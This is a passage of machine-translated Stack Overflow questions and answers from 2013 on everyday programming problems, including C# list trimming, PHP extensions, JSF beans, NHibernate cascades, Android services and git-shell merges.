            'name' => 'Promo pack item 1',
            'image' => '/images/promopackitem1.jpg'
            ),
        array(
            'name' => 'Promo pack item 2',
            'image' => '/images/promopackitem2.jpg'
            )
        )
);
echo json_encode($list_of_items); 
```

[然后，您使用parseJSON](http://api.jquery.com/jQuery.parseJSON/)在 JavaScript 中解码该数据。

如果用户单击没有子项目的项目，您只需将其添加到订单中。如果用户单击带有子项目的项目，则添加项目本身和所有子项目。由于您将该数据作为一个简单的数组（感谢 JSON 格式），您可以通过访问该数组的元素来处理数据。

# jsf - 使用@ViewScoped 打开两次时页面的奇怪行为

> ID：15357906
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:05.507
> 
> 标签：jsf, myfaces

我有如下所示的bean：

```
@ManagedBean(name = "reportDetailsBean")  
@ViewScoped  
public class ReportDetailsBean implements Serializable {  
    // content...  
} 
```

和带有这部分代码的 JSF 页面：

```
...  
<a4j:queue id="reportQueue" status="globalStatus" />  
<a4j:form id="reportForm#{reportDetailsBean.report.id}" ajaxSingle="true" ajaxSubmit="true" eventsQueue="reportQueue" reRender="reportForm" styleClass="">  
    ...  
    <a4j:outputPanel id="salesItemNameHeader" layout="block" style="cursor: pointer;" rendered="#{reportDetailsBean.model.rowCount gt 0}">  
        <h:outputText value="#{bundle.reportDetails_salesItem}" />  
        <rich:spacer width="4px" />  
        <a4j:support event="onclick" reRender="reportTable" action="#{reportDetailsBean.model['sortTableByColumn']}" status="globalStatus" ajaxSingle="true">  
            <a4j:actionparam name="columnIndex" value="bySalesItemName" assignTo="#{reportDetailsBean.model['currentSortModelItem']}" />  
        </a4j:support>  
    </a4j:outputPanel>  
... 
```

JSF 页面处理来自 URL 的参数 id。这个 JSF 页面的正确地址是 example `localhost/reportDetails.jsp?reportId=37`。

当我想打开 reportDetails.jsp 两次时会出现问题 - 使用不同的参数。

有两种情况。第一个：
1）打开`reportDetails.jsp?reportId=1`
2）打开`reportDetails.jsp?reportId=2`
3）对`ReportDetailsBean`实例`reportDetails.jsp?reportId=1`的引用被更改为对`ReportDetailsBean`实例的引用`reportDetails.jsp?reportId=2`

第二个：
1）打开`reportDetails.jsp?reportId=1`
2）点击几次链接，如上图所示
3）打开`reportDetails.jsp?reportId=2`
4）一切正常 - 每个视图都有自己的实例`ReportDetailsBean`

有人可以解释一下为什么在第一个场景中对 backbean 的引用发生了更改吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:09:12.890

如果你有`ViewScoped`豆子，他们会为一种观点而活。如果您在浏览器中输入另一个地址或重定向到另一个页面，则会出现另一个视图，以及您的视图范围 bean 的另一个实例。

**也可以看看：**

*   [视图范围 bean 在导航 JSF 中是否存在](https://stackoverflow.com/a/4831963/759126)

# solr - solr - 查询搜索中未显示索引文档

> ID：15357911
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:09.500
> 
> 标签：solr

我已将 3762587 个文档索引到 solr。我仔细检查了我的数据库，它的行数/文档数相同。

我正在对链接进行查询，因此 mm 参数是 100% 匹配的。问题是某些查询没有返回结果，即使我可以在我的数据库中看到记录。我不明白为什么有些查询有效而有些无效...

这是我的 schema.xml：

```
<fields>
           <field name="id" type="string" indexed="true" stored="false" required="true" />
           <field name="title" type="string" indexed="true" stored="true"/>
           <field name="imgUrl" type="string" indexed="true" stored="true"/>
           <field name="_version_" type="long" indexed="true" stored="true" multiValued="false" />
</fields> 
```

我还为图片链接搜索配置了一个请求处理程序：

```
<requestHandler name="/image" class="solr.SearchHandler">
     <lst name="defaults">
       <str name="echoParams">explicit</str>
       <str name="wt">json</str>
       <str name="indent">true</str>
       <str name="df">imgUrl</str>
       <str name="defType">edismax</str>
       <str name="qf">imgUrl</str>
       <str name="mm">100%</str>    <!-- Minimum match -->
       <str name="rows">10</str>
       <str name="fl">*,score</str>
     </lst>
  </requestHandler> 
```

请求如下所示：

```
myserver/solr/collection1/image?q=http://imagesserver.com/images/21533515483100.jpg 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-13T14:59:12.593

是的，我的解决方案有效！我将 schema.xml 中的类型从 string 更改为 text_ws，现在我总能得到答案！

# c# - 删除列表开头和结尾的空行 ?

> ID：15357914
> 
> 赞同：5
> 
> 时间：2013-03-12T09:50:21.253
> 
> 标签：c#, .net, string

给定 a`List<string>`我需要**删除列表开头和结尾的所有空行**。

注意：我认为空行是没有内容的行，但可能包含空格和制表符。这是检查一行是否为空的方法：

```
 private bool HasContent(string line)
    {
        if (string.IsNullOrEmpty(line))
            return false;

        foreach (char c in line)
        {
            if (c != ' ' && c != '\t')
                return true;
        }

        return false;
    } 
```

你会建议什么高效且可读的代码来做到这一点？

### 确认示例

```
[" ", " ", " ", " ", "A", "B", " ", "C", " ", "D", " ", " ", " "] 
```

应该通过删除开头*和*结尾的所有空行来修剪这样的列表，以得到以下结果：

```
["A", "B", " ", "C", " ", "D"] 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-03-12T09:56:36.980

```
var results = textLines1.SkipWhile(e => !HasContent(e))
                        .Reverse()
                        .SkipWhile(e => !HasContent(e))
                        .Reverse()
                        .ToList(); 
```

这个怎么运作？跳过列表中的所有空行，反转它并执行相同操作（实际上跳过列表后面的所有空行）。在另一个反向之后，您会以正确的顺序获得正确的结果。

如果列表真的很大`while`，出于性能考虑，您可以考虑使用标准循环和列表索引，但对于正常数据而言，回归应该无关紧要。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-03-12T10:01:09.287

首先，有一个内置方法可以检查：[`String.IsNullOrWhiteSpace();`](http://msdn.microsoft.com/en-us/library/system.string.isnullorwhitespace.aspx)

ColinE 提供的答案不符合要求，因为它删除了所有空行，而不仅仅是在开头或结尾处。

我认为您需要构建自己的解决方案：

```
int start = 0, end = sourceList.Count - 1;

while (start < end && String.IsNullOrWhiteSpace(sourceList[start])) start++;
while (end >= start && String.IsNullOrWhiteSpace(sourceList[end])) end--;

return sourceList.Skip(start).Take(end - start + 1); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-03-12T09:54:33.383

使用 Linq，您可以执行以下操作：

```
IEnumerable<string> list  = sourceList.SkipWhile(source => !HasContent(source))
                                      .TakeWhile(source => HasContent(source)); 
```

这会“跳过”字符串，直到找到有内容的字符串，然后“获取”所有字符串，直到找到没有内容的字符串。

尽管正如@MarcinJuraszek 指出的那样，这将在没有内容的第一行之后停止，而不是删除列表末尾的那些。

为此，您可以使用以下内容：

```
IEnumerable<string> list  = sourceList.SkipWhile(source => !HasContent(source))
                                      .Reverse()
                                      .SkipWhile(source => !HasContent(source))
                                      .Reverse(); 
```

有点令人费解，但应该可以解决问题。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-03-12T10:13:04.880

检查我刚才做的这个扩展方法：

```
public static class ListExtensions
{
    public static List<string> TrimList(this List<string> list)
    {
        int listCount = list.Count;
        List<string> listCopy = list.ToList();
        List<string> result = list.ToList();

        // This will encapsulate removing an item and the condition to remove it.
        // If it removes the whole item at some index, it return TRUE.
        Func<int, bool> RemoveItemAt = index =>
        {
            bool removed = false;

            if (string.IsNullOrEmpty(listCopy[index]) || string.IsNullOrWhiteSpace(listCopy[index]))
            {
                result.Remove(result.First(item => item == listCopy[index]));
                removed = true;
            }

            return removed;
        };

        // This will encapsulate the iteration over the list and the search of 
        // empty strings in the given list
        Action RemoveWhiteSpaceItems = () =>
        {
            int listIndex = 0;

            while (listIndex < listCount && RemoveItemAt(listIndex))
            {
                listIndex++;
            }
        };

        // Removing the empty lines at the beginning of the list
        RemoveWhiteSpaceItems();

        // Now reversing the list in order to remove the 
        // empty lines at the end of the given list
        listCopy.Reverse();
        result.Reverse();

        // Removing the empty lines at the end of the list
        RemoveWhiteSpaceItems();

        // Reversing again in order to recover the right list order.
        result.Reverse();

        return result;
    }
} 
```

...及其用法：

```
List<string> list = new List<string> { "\t", " ", "    ", "a", "b", "\t", "         ", " " };

// The TrimList() extension method will return a new list without
// the empty items at the beginning and the end of the sample list!
List<string> trimmedList = list.TrimList(); 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2013-03-12T12:16:47.770

这种方法修改了*原始* `List<string>`对象，而不是创建具有所需属性的新对象：

```
static void TrimEmptyLines(List<string> listToModify)
{
  if (listToModify == null)
    throw new ArgumentNullException();

  int last = listToModify.FindLastIndex(HasContent);
  if (last == -1)
  {
    // no lines have content
    listToModify.Clear();
    return;
  }
  int count = listToModify.Count - last - 1;
  if (count > 0)
    listToModify.RemoveRange(last + 1, count);

  int first = listToModify.FindIndex(HasContent);
  if (first > 0)
    listToModify.RemoveRange(0, first);
} 
```

在这段代码中，`HasContent`是来自原始问题的方法。可以将匿名函数（如 lambda）用于委托。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-12T09:58:28.733

下面的代码可以满足您的需要：

```
List<string> lines = new List<string> {"   \n\t", " ", "aaa", "  \t\n", "bb", "\n", " "};
IEnumerable<string> filtered = lines.SkipWhile(String.IsNullOrWhiteSpace).Reverse().SkipWhile(String.IsNullOrWhiteSpace).Reverse(); 
```

它将列表反转两次，因此如果性能是关键，它可能不是理想的解决方案。

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-03-12T10:06:25.120

您可以使用 [isnullorwhitespace](http://www.dotnetperls.com/isnullorwhitespace) 来检查：请参见下面的示例。

```
 List<string> lines = new List<string>();
        lines.Add("         ");
        lines.Add("one");
        lines.Add("two");
        lines.Add("");
        lines.Add("");
        lines.Add("five");
        lines.Add("");
        lines.Add("       ");
        lines.RemoveAll(string.IsNullOrWhiteSpace); 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2013-03-12T10:09:28.007

```
List<string> name = new List<string>();
name.Add("              ");
name.Add("rajesh");
name.Add("raj");
name.Add("rakesh");
name.Add("              ");
for (int i = 0; i < name.Count(); i++)
{
  if (string.IsNullOrWhiteSpace(Convert.ToString(name[i])))
  {
    name.RemoveAt(i);
  }
} 
```

* * *

## 回答 #9

> 赞同：-2
> 
> 时间：2013-03-12T09:54:38.857

关于形成您的代码，我猜您的行既不包含空格也不包含制表符，因此您可以`foreach`将

```
if(line.Contains(' ') || line.Contains('\t'))
   return false;
return true; 
```

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2013-03-12T10:06:02.347

```
List<string> name = new List<string>();
name.Add("              ");
name.Add("rajesh");
name.Add("raj");
name.Add("rakesh");
name.Add("              ");

name.RemoveAt(0);
name.RemoveAt(name.Count() - 1); 
```

# php - 启用 PHP 的 zip 扩展

> ID：15357917
> 
> 赞同：7
> 
> 时间：2013-03-12T09:50:23.010
> 
> 标签：php, zip, extension-methods

我正在尝试在 PHP 中启用 .zip 扩展名，但下面的函数返回 false。

```
if (!extension_loaded('zip')) {
    return false;
} 
```

如何在不使用 php.ini 的情况下启用 .zip 扩展？

是否可以启用 using `ini_set()`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-12T09:53:35.750

假设您实际上在服务器上有可用的 ZIP 扩展名，您可以使用[`dl()`](http://www.php.net/dl)它来动态加载它（<5.3）。

```
if (!extension_loaded('zip')) {
    // Attempt to load the zip
    $prefix = (PHP_SHLIB_SUFFIX === 'dll') ? 'php_' : '';
    dl($prefix . 'zip.' . PHP_SHLIB_SUFFIX);

    if (!extension_loaded('zip')) {
        // Couldn't load the ZIP module dynamically, either
        return false;
    }
} 
```

* * *

`dl`如果您使用的是 5.3.0 以上的版本，除非它在命令行上运行或嵌入到 Web 服务器中，否则您将无法使用。

`php.ini`如果您无法使用 PHP 内置的模块重新编译，那么您唯一的选择就是修改。您不能使用 来执行此操作`ini_set`，因为它只会在运行时应用，而 PHP 可执行文件在启动时已经加载了所有必需的模块。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T10:11:21.447

用这个，

```
if (!extension_loaded('zip'))
{ 
    $prefix = (PHP_SHLIB_SUFFIX == 'dll') ? 'php_' : '';
    dl($prefix . 'zip.' . PHP_SHLIB_SUFFIX);
    if (!extension_loaded('zip')) 
    {
       return false;
    }
} 
```

# node.js - 避免发出“clientError”时执行的路由

> ID：15357919
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:35.630
> 
> 标签：node.js, express

`handler`发出“clientError”时如何避免被调用？可以办到？

```
var server=http.createServer(app).listen(app.get('port'), function(){
  console.log("Express HTTP server listening on port " + app.get('port'));
}).on('clientError', function(ex,socket){
    console.log(ex); 
    //socket is undefined here
});

app.post('/delete-files',handler);

handler = function(req,res){
  console.log(req.body.files)
  // other stuff goes here
} 
```

我试图通过使用 Tamper Data 拦截和修改 POST 参数来使我的应用程序崩溃。帖子由 jQuery`post`函数发送。Post 参数是一个数组。当我使用 Tamper Data 修改数组时，我得到：

```
Error: Parse Error 
undefined
Error: Parse Error
undefined   
Error: Parse Error
undefined 
Error: Parse Error
undefined
Error: Parse Error 
undefined
Error: Parse Error
undefined
Error: Parse Error
undefined 
```

1.  解析错误来自“clientError”事件回调
2.  从 console.log(req.body.files) 未定义

它总是被准确地调用 7 次。

这应该和AJAX有关

POST参数数组：

> 文件[] file1.txt

篡改数据修改后的 POST 参数

> 文件 [] 文件 5.txt

# php - WordPress API 标准

> ID：15357920
> 
> 赞同：-2
> 
> 时间：2013-03-12T09:50:36.330
> 
> 标签：php

我正在 wordpress 网站上安装贝宝。内置 API 要求以下标准：

*   (1) API 用户名
*   (2) API 密码
*   (3) API签名

你能告诉我从哪里可以得到这些信息吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:29:02.990

根据评论

登录您的帐户并查找详细信息，如帖子[http://www.putler.com/support/faq/how-to-get-paypal-api-username-password-and-signature-information/中所示](http://www.putler.com/support/faq/how-to-get-paypal-api-username-password-and-signature-information/)

# intellij-idea - Intellij IDEA：按真实顺序查看类方法

> ID：15357923
> 
> 赞同：43
> 
> 时间：2013-03-12T09:50:38.133
> 
> 标签：intellij-idea

我正在从 Eclipse 切换到 IntelliJ IDEA。目前我正在使用 IDEA v 12.0.4。

在 Eclipse 中，当您调用 Class Outline 视图 ( `Ctrl`+ `O`) 时，您会按照它们在类中声明的顺序看到方法。`Ctrl`虽然 IDEA ( + ) 中类似的文件结构视图`F12`按字母顺序列出了方法，但我发现在某些情况下对自己不太方便。

IDEA 的 File Structure 弹出窗口中是否有办法查看按照它们在类中出现的顺序列出的类方法？理想情况下，我希望有可能从字母顺序切换到自然顺序。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2013-03-12T09:58:01.167

使用 **“结构”工具窗口**（Windows 上的`Alt`+ ，`7``⌘</kbd>+`7` on OS X) instead of the "File structure" popup.`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-08T08:25:50.317

`Floating`您可以在模式中使用结构工具窗口。
然后使用`Alt+7`而不是`Ctrl+0`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-04-05T11:44:51.843

实际上有一个功能允许“按外观”排序并省略成员/字段和方法的分组。[我在这里](https://stackoverflow.com/a/30732526/114626)找到了答案，在这个问题的副本中：

> 您可以在项目窗口的右上角找到设置图标，在那里您可以找到如下选项，以获得自然顺序。
> 
> `sort by type`

但是根据[文档](https://www.jetbrains.com/help/idea/2016.1/project-tool-window.html)，此功能应该完全做其他事情：

> 如果该选项关闭，则项目（文件、类等）按字母顺序排序。如果该选项打开，文件将按其扩展名排序。这些`.java`文件按以下顺序出现：接口、类、枚举等。

# objective-c - GCDAsyncSocket 2 同时请求？

> ID：15357924
> 
> 赞同：2
> 
> 时间：2013-03-12T09:50:40.420
> 
> 标签：objective-c

使用`GCDAsyncSocket`该类，我知道在要求向服务器写入 2 次时有一个队列，但我们可以看到，如果我们有 2 个请求，第一个是文件，第二个是字符串，服务器获取文件但永远不要得到它之后的字符串。如果我们写 2 个字符串，它确实可以工作。

我猜该文件需要时间，所以字符串在中间某处丢失，或者他将它与文件放在一起？（每个请求都是单独工作）。

这是 2 个请求：（第一个是图像文件，第二个是字符串）

```
[asyncSocket  writeData: [self setProtocolDataForImage:[[image copy] autorelease] WithCommand:5] withTimeout:-1 tag:-1];

[asyncSocket  writeData: [self setProtocolDataForString:[[user copy] autorelease] WithCommand:4] withTimeout:-1 tag:-1]; 
```

# sharepoint - 在没有本地共享点实例的情况下部署 Sharepoint 2010 Web 部件？

> ID：15357925
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:42.380
> 
> 标签：sharepoint, sharepoint-2010

有没有办法在没有本地共享点实例的情况下部署 Sharepoint 2010 Web 部件？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-13T15:39:02.260

此外，如果您使用 Visual Studio 2012，您可以发布到远程 SharePoint 服务器上的 SharePoint 沙盒解决方案。你可以在这里找到更多信息[http://msdn.microsoft.com/en-us/library/hh370987.aspx](http://msdn.microsoft.com/en-us/library/hh370987.aspx)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-12T12:37:37.947

是的，您可以使用 Web 界面来执行此操作。上传解决方案并通过中央管理控制台进行部署。

如果您正在考虑使其自动化，这不是一件容易的事，但理论上您可以打开远程 powershell 会话并使用 powershell 从服务器中的共享/映射文件夹部署解决方案。从来没有这样做过，所以不确定。

# c# - NHibernate - SQL Server CE - 删除级联不起作用

> ID：15357926
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:42.493
> 
> 标签：c#, nhibernate, sql-server-ce, hql, cascading-deletes

我有两张桌子：

*   收据
*   收据日志

`Receipt`有 0...n`ReceiptJournals`

此 (in `Receipt`) 的映射如下所示：

```
this.HasMany(x => x.ReceiptJournals).AsSet().Fetch.Select().Inverse().Cascade.Delete(); 
```

我使用的底层数据库是 SQL Server CE 4.0。

现在，当我执行删除语句时

```
const string sql = "delete from Receipt where IsFinished = 0 and IsParked = 0";
var query = NHibernateHelper.CurrentSession.CreateSQLQuery(sql);
query.ExecuteUpdate(); 
```

我得到一个例外：

> 无法执行本机批量操作查询：从收据中删除，其中 IsFinished = 0 和 IsParked = 0 [SQL：从收据中删除，其中 IsFinished = 0 和 IsParked = 0]
> 
> System.Exception {NHibernate.Exceptions.GenericADOException}
> 
> [System.Data.SqlServerCe.SqlCeException] {"Der Primärschlüsselwert kann nicht gelöscht werden, da noch Verweise auf diesen Schlüssel vorhanden sind. [外键约束名称 = FK_Receipt_ReceiptJournal ]"} System.Data.SqlServerCe.SqlCeException

NHibernate 与 SQL Server CE 不支持级联删除还是我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T13:10:06.183

你可能想要`Cascade.AllDeleteOrphan()`. 这是一个时间问题，NHibernate 试图首先从 Receipt 中删除，但由于外键约束而无法删除。将级联策略设置为 AllDeleteOrphan() 将导致它首先删除 ReceiptJournal 记录，因为它们将被孤立。

# highcharts - 条形图系列 显示系列之间的差距

> ID：15357929
> 
> 赞同：0
> 
> 时间：2013-03-12T09:50:55.003
> 
> 标签：highcharts

在使用条形图时，我遇到了一种情况。如果我将一个系列留空，或者我将系列的某些点留空，则图表会为该系列产生间隙。从下面的 jsfiddle 可以看出，我从纽约删除了一些点。如果图表系列中的某个点丢失，您能帮我制作没有这些间隙的条形吗？

-- [http://jsfiddle.net/gh/get/jquery/1.7.2/highslide-software/highcharts.com/tree/master/samples/highcharts/demo/column-basic/](http://jsfiddle.net/gh/get/jquery/1.7.2/highslide-software/highcharts.com/tree/master/samples/highcharts/demo/column-basic/)

```
enter code here 
```

--- [http://jsfiddle.net/7kNCn/1/](http://jsfiddle.net/7kNCn/1/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:51:44.407

目前无法解决。[您可以在http://highcharts.uservoice.com](http://highcharts.uservoice.com)上发布功能请求

# asp.net-mvc - MVC3 用值和名称填充下拉列表

> ID：15357931
> 
> 赞同：3
> 
> 时间：2013-03-12T09:51:00.263
> 
> 标签：asp.net-mvc, asp.net-mvc-3, http-post, html-select

使用 MVC3。我已经有一个从数据库表**填充的****DropDownList**。

 **目前仅使用 Units.Name 填充，但我还想使用其 Unit.Id 填充它（将在下拉列表中隐藏），以便在用户选择项目时获取 ID 并在单击创建按钮时使用它（POST 方法）。

我需要修改什么才能使其以这种方式工作？

我知道这是微不足道的，但我是 MVC 的新手。我尝试了很多可能性，但都没有成功。

控制器...

```
public ActionResult Create()
{

private BridgeEntities db = new BridgeEntities();

    var query = (from units in db.Units
                 select units).ToList().OrderBy(q => q.Name);

    List<string> listOfUnits = new List<string>();
    foreach (var item in query)
    {
        listOfUnits.Add(item.Name);
    }
    ViewBag.ListOfUnits = listOfUnits;

    return View();
} 
```

在创建视图中...

```
@Html.DropDownList("Unit",new SelectList(ViewBag.ListOfUnits)) 
```

我的创建按钮...

```
<button type="submit" class = "btn btn-success">
    <i class="icon-plus icon-white"></i> Create
</button> 
```

提前致谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T09:58:00.507

```
ViewBag.ListOfUnits = new SelectList(db.Units.OrderBy(q => q.Name).ToList(), 
                                         "Id", 
                                         "Name"); 
```

**更新：**

在我的头顶上：

```
// Select Ids to exclude from list
IQueryable<int> exclude = db.DeprecatedUnits.Select(p => p.UnitID);

// Select units for selectlist, ignore the ids which are in exclude list
var units = db.Units.Where(q => !exclude.Contains(q.Id)).OrderBy(q => q.Name).ToList();

// Create the selectlist
ViewBag.ListOfUnits = new SelectList(units,"Id","Name"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-12T09:55:12.180

```
ViewBag.ListOfUnits = (from units in db.Units select units)
                      .ToList().OrderBy(q => q.Name)
                      .Select(s => new SelectListItem 
                      { 
                          Text = s.Name, 
                          Value = s.Id// or s.ID , what property does your model have...
                      }; 
```**

# asp.net - ASP.net 中的可编辑网格

> ID：15357932
> 
> 赞同：0
> 
> 时间：2013-03-12T09:51:09.277
> 
> 标签：asp.net, gridview, datagrid, grid

我正在寻找 ASP.net 可编辑网格视图的代码。
在一些网站上，我得到了编码。但它有一个额外的按钮，如编辑或更新。单击该按钮后，网格变为可编辑的。你可以[在这里](http://www.codeproject.com/Articles/23471/Editable-GridView-in-ASP-NET-2-0)看到它。

但是当我单击网格的单元格时，我希望网格能够得到编辑。我不想要额外的按钮来点击然后进行编辑。

那么如何通过单击使网格可编辑呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-12T10:37:29.067

> 您需要使用`RowDataBound`您的事件`GridView`来实现这一点。我已经写了一个示例，说明如何做到这一点。将其更改为您的要求。

```
<asp:GridView runat="server" ID="gv" onrowdatabound="gv_RowDataBound" 
              onrowediting="gv_RowEditing">
</asp:GridView> 
```

> 代码隐藏将如下所示：

```
private void LoadGrid()
{
    gv.DataSource = YourDataSource;
    gv.DataBind();
}

protected void gv_RowDataBound(object sender, GridViewRowEventArgs e)
{
    if (e.Row.RowType == DataControlRowType.DataRow)
    {
        e.Row.Attributes["onclick"] = ClientScript.GetPostBackClientHyperlink(this.gv, "Edit$" + e.Row.RowIndex);

    }
}

protected void gv_RowEditing(object sender, GridViewEditEventArgs e)
{
    gv.EditIndex = e.NewEditIndex;
    this.LoadGrid();  
} 
```

# android - 如何将消息从活动发送到服务并在服务运行时执行它们？

> ID：15357942
> 
> 赞同：1
> 
> 时间：2013-03-12T09:51:30.933
> 
> 标签：android, service, android-activity, handler, intentservice

我有一个活动开始`IntentService`：

```
intent = new Intent(MyApplication.getAppContext(), MyService.class);
intent.putExtra("EXTRA_DEVICE_ADDRESS", value);
MyApplication.getAppContext().startService(intent); 
```

该服务使用我发送的 MAC 地址启动蓝牙连接。

```
device = mBluetoothAdapter.getRemoteDevice(macAddress);

public ConnectThread(BluetoothDevice device) {
    this.mmDevice = device;
    BluetoothSocket tmp = null;
    try {
        tmp = device.createRfcommSocketToServiceRecord(UUID.fromString(SPP_UUID));
    } catch (IOException e) {
        e.printStackTrace();
    }
    mmSocket = tmp;
} 
```

我听：

```
while (true) {
    try {
        if (mmInStream.available() != 0) {
            bytes = mmInStream.read(buffer);    
            String readMessage = new String(buffer, 0, bytes);
            sendMessageToActivity("incoming", readMessage);
        } else {
            SystemClock.sleep(100);
        } 
```

并将收到的消息发送回活动：

```
public void sendMessageToActivity(String type, String message) {
    intent = new Intent(BROADCAST_ACTION);
    intent.putExtra(type, message);
    sendBroadcast(intent);
} 
```

我使用 a`BroadcastReceiver`从服务接收消息：

```
private BroadcastReceiver mMessageReceiver = new BroadcastReceiver() {

    @Override
    public void onReceive(Context context, Intent intent) {
        updateUI(intent);
    }
}; 
```

我从活动中调用（问题的***一部分***）：

```
private void writeOut(final String message) {
    msg = message;
    byte[] send = msg.getBytes();
    MyService.write(send);
} 
```

这是服务的静态`write()`方法：

```
public static void write(byte[] out) {
    // Create temporary object
    ConnectedThread r;
    // Synchronize a copy of the ConnectedThread
    synchronized (obj) {
        if (mState != STATE_CONNECTED)
            return;
        r = mConnectedThread;
    }
    // Perform the write unsynchronized
    r.write(out);`
} 
```

**我的问题：**上述所有工作都按预期工作，除了`MyService.write(send)`. UI 卡住了。我尝试使用 an`AsyncTask`但它没有用。我认为我需要停止使用该静态`write()`方法并将消息发送到服务并让他完成这项工作。我相信我需要`Handler`在活动中初始化 a ，通过意图将其发送到服务`startService()`。

我想跟踪进出服务的消息。它可以很好地处理传入的消息。我需要找到一种方法来正确接收来自活动的消息，执行它们，然后将信息发送回活动。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-13T09:33:13.333

首先，关于[`IntentService`](http://developer.android.com/reference/android/app/IntentService.html)：

> 所有请求都在单个工作线程上处理——它们可能需要尽可能长的时间（并且不会阻塞应用程序的主循环），但一次只会处理***一个***请求。

因此，请考虑将您的代码移动到[`Service`](http://developer.android.com/reference/android/app/Service.html). 我不确定蓝牙连接和[`NetworkOnMainThreadException`](http://developer.android.com/reference/android/os/NetworkOnMainThreadException.html)，但以防万一：请注意 a`Service`在主 UI 线程上运行，因此为避免此类异常，您将需要`Thread`在服务中使用类似的东西。不要使用[`AsyncTask`](http://developer.android.com/reference/android/os/AsyncTask.html)，因为*理想情况下 AsyncTasks 应该用于短操作（最多几秒钟）。*还要注意系统将自动管理服务的生命周期，你*不应该*/*不能*在任何静态方法中与它交互。

现在回到你的问题。您使用广播接收器（将消息从服​​务发送到活动）的方式是正确的，但请考虑使用[`ResultReceiver`](http://developer.android.com/reference/android/os/ResultReceiver.html)（在 API 3+ 中可用）。我认为使用`ResultReceiver`比发送广泛的广播消息要好。您可以将 a`ResultReceiver`放入`Intent`.

并且要将消息从活动发送到服务，我假设您已移至`Service`. 您可以将任何内容放入一个`Intent`并`startService()`再次调用以发送它。您将在[`onStartCommand()`](http://developer.android.com/reference/android/app/Service.html#onStartCommand%28android.content.Intent,%20int,%20int%29). 或者，如果您使用[此技术绑定了服务，则可以](http://developer.android.com/guide/components/services.html#CreatingBoundService)*直接*从活动内部调用服务的方法。

SDK 文件夹中有一些使用服务的示例项目`[Android SDK]/samples/`。在模拟器上，您可以在名为 API Demos 的应用程序中测试这些项目。

# jquery - 仅在可用时重置按钮

> ID：15357945
> 
> 赞同：0
> 
> 时间：2013-03-12T09:51:37.423
> 
> 标签：jquery, html, internet-explorer-8, firefox-3

我有一个包含大约 50 个输入字段、列表、复选框和选择的表单。我有一个提交和一个重置按钮。我想

*   如果未进行任何更改，则禁用重置按钮，
*   如果用户或 javascript 更改了值，则激活，并且
*   如果用户删除了他的更改，则重新激活。

浏览器中是否有任何内置功能可以知道重置按钮是否有意义？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-12T10:11:52.333

为什么不只是在页面上默认停用/禁用重置按钮并使用 jquery`.change`监听更改并激活/启用按钮。

你可以这样做：http: [//jsfiddle.net/gNS8L/](http://jsfiddle.net/gNS8L/)

如果输入字段值已更改（注意：您可以省略带有原始值的部分，它会检查它是否已更改回原始值）您从按钮中删除 disabled 属性。如果按下按钮，它会再次被禁用，如果值变回原始值，您也可以禁用它。

**编辑：**所以你这样做是为了将其重置为原始值：http: [//jsfiddle.net/gNS8L/1/](http://jsfiddle.net/gNS8L/1/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-12T10:14:22.197

使用[jquery 脏表单插件](http://archive.plugins.jquery.com/project/dirtyform)，它正是为此而生的

# git - git-shell 合并到不同的路径

> ID：15357947
> 
> 赞同：1
> 
> 时间：2013-03-12T09:51:43.430
> 
> 标签：git, merge, git-bash

我的 git 远程存储库有一个问题。我已经为 git-shell 访问创建了一个 git 用户。

当有人加入 shell 时，主路径是**/home/git/**，这没关系。问题是：我的存储库路径是**/var/www/**并且我希望 git 用户可以在此目录中合并但不使用 bash shell（所以我不提供使用*cd*在服务器内部导航的可能性）。

Git-shell 有执行**合并**命令的能力吗？最后还有可能指定路径吗？

我没有找到任何关于 git-shell 的合并。

我正在考虑创建一个可以通过 web 执行的 .sh 脚本。但是直接通过 git shell 提供功能可以从根本上解决一些安全问题。

在此先感谢，毛罗。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-10-02T13:27:39.240

我尝试为此做一个解决方法，临时为我工作。但我不建议您以与我相同的方式公开脚本，并尝试找出其他替代方案。

Basic 在我的 git 存储库中，我创建了这个 bash 脚本。

```
#!/bin/sh
GIT_MERGE_AUTOEDIT=no
export GIT_MERGE_AUTOEDIT
git merge [name_of_branch_one]
git merge [name_of_branch_two] 
```

之后，我创建了一个简单的 php 函数，用于调用 sh 脚本，如下所示：

```
$exec = exec("sh /Your_Git_Repository_dir/merge.sh");
if($exec){
    print_r($exec);
} 
```

我希望这会有所帮助。

# javascript - 使用 javascript 直接访问某个驱动器、文件夹和文件

> ID：15357948
> 
> 赞同：0
> 
> 时间：2013-03-12T09:51:44.770
> 
> 标签：javascript

